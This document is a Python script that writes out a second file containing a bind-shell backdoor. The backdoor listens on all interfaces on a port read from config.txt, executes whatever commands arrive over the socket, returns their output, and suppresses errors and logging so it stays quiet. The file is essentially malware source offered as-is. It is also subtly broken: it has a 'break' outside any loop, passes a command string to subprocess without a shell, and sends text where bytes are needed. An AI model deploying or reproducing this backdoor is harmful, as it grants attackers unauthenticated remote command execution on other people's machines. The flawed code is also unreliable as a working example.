import time, logging , sys

def allthecode():
    global filetxtwithport
    filetxtwithport = 'config.txt'
    try:
     with open(filetxtwithport,"r") as file:
        okok = file.readlines()
        porta = int(okok[0].strip())
    except Exception as err:
        print("port file error")
        break
    finally:
        filename13 = 'shellpy' + str(int(time.time())) + '.py'
        with open(filename13,'w') as filewrite:
            filewrite.write("""import socket
import subprocess
import sys
import time
import logging

# Configura il logging, senza output su console ma solo su file
logging.basicConfig(
    level=logging.CRITICAL,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logfile2.log')
        # Puoi aggiungere anche StreamHandler() se vuoi anche log su console
    ]
)

class servershell:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn = None
        self.addr = None
        self.data = None
        self.resultcmd = None

    def infost(self):
        # Leggi la porta da un file di configurazione
        config_file = 'config.txt'
        try:
            with open(config_file, "r") as file:
                port_line = file.readlines()[0]
                self.port = int(port_line.strip())
        except Exception as e:
            # Se c'è errore, termina senza output
            sys.exit(1)

        # Imposta l'IP a 0.0.0.0 per ascoltare su tutte le interfacce
        self.ip = '0.0.0.0'

        # Tenta di collegarsi
        self.credentialconnect()

    def credentialconnect(self):
        try:
            self.socket.bind((self.ip, self.port))
        except Exception:
            # Errori di binding, termina senza output
            sys.exit(1)

        try:
            self.socket.listen(1)
            # Log minimo o nullo, come richiesto
        except Exception:
            sys.exit(1)

        try:
            self.conn, self.addr = self.socket.accept()
        except Exception:
            # Se l'accept fallisce, termina
            sys.exit(1)

        # Connessione stabilita
        # Log minimo
        while True:
            try:
                self.data = self.conn.recv(1024).decode("latin1", errors="ignore")
            except Exception:
                break  # Se errori di ricezione, esce dal ciclo

            if not self.data:
                break  # Se niente ricevuto, termina ciclo

            try:
                # Esegue il comando ricevuto
                self.resultcmd = subprocess.run(
                    self.data,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    errors="ignore"
                )
            except Exception:
                # Se fallisce l'esecuzione, continua
                continue

            try:
                # Invia l'output del comando
                output = self.resultcmd.stdout + self.resultcmd.stderr
                self.conn.sendall(output)
            except Exception:
                break  # Se errori nell'invio, termina

        # Chiudi connessione e socket
        self.conn.close()
        self.socket.close()

if __name__ == "__main__":
    server = servershell()
    server.infost() """)


     
    
    





















